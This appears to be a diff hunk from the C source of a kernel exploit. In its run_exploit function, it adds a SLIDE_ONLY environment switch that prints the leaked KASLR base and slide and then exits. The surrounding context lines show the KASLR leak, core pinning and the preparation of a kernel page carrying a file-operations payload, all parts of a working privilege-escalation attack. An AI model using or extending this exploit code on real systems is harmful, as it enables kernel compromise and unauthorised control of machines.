@@ -184,6 +184,11 @@ int run_exploit(int argc, char **argv) {
     pr_error("slide kaslr leak failed\n");
     return 1;
   }
+  if (getenv("SLIDE_ONLY")) {
+    pr_success("slide-only done base=%016zx slide=%016zx\n",
+               kaslr_base, kaslr_slide);
+    return 0;
+  }
 
   pin_to_core(CORE);
   page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
